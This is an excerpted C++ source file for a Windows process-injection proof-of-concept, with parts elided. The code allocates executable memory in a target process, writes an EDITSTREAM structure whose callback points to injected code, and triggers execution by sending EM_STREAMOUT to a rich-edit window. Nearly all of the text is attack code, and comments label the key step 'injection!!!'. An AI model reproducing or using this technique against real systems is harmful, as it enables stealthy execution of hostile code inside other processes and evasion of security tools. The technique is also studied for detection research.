// EditStreamCallback_injection.cpp : Defines the entry point for the console application.
//
...
int ToBeInjected(DWORD_PTR dwCookie, LPBYTE pbBuff,	LONG cb, LONG *pcb)
{
#ifdef _WIN64	
	...
	return 1;  //need to return non zero to indicate an error for the EditStreamCallback
	//never ever return 0 as it will endlessly call this CALLBACK function, potentially DOS-ing your computer :)
}
...
LPVOID copy_structure_to_target(DWORD pid, EDITSTREAM es)
{
	...
	printf("[*] Allocating memory for EDITSTREAM structure in target process\n");
	LPVOID lpBaseAddress;
	lpBaseAddress = VirtualAllocEx(hProcess, NULL, sizeof(EDITSTREAM), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	...
	BOOL resWPM;
	printf("[*] Writing EDITSTREAM structure to target process\n");
	resWPM = WriteProcessMemory(hProcess, lpBaseAddress, (LPVOID)&es, sizeof(EDITSTREAM), lpNumberOfBytesWritten);
	if (!resWPM)
	{
		ErrorExit(TEXT("WriteProcessMemory"));
	}
	printf("[+] Wrote EDITSTREAM structure to target process\n");
	return lpBaseAddress;
}

//the actual injector function
void inject_EditStreamCallback(LPINJECTINFO ii, HWND hwnd)
{
	DWORD dwProcessID = 0;
	...
	if (dwProcessID == ii->pid) //if it matches the pid where we want to inject
	{
		...
		*/
		...
		es.dwCookie = NULL;
		es.dwError = NULL;
		es.pfnCallback = (EDITSTREAMCALLBACK)(ii->address);
		//need to copy the EDITSTREAM structure to the target
		LPVOID es_address = copy_structure_to_target(ii->pid, es);
		res = SendMessage(hwnd, EM_STREAMOUT, (WPARAM)SF_RTF, (LPARAM)es_address); //injection!!!
		//res = SendMessage(hwnd, EM_STREAMIN, (WPARAM)SF_RTF, (LPARAM)es_address); //same effect but will erase text
...
static BOOL CALLBACK enumChildWindowCallback(HWND hwnd, LPARAM lparam)
{
	...
	inject_EditStreamCallback((LPINJECTINFO)lparam, hwnd);
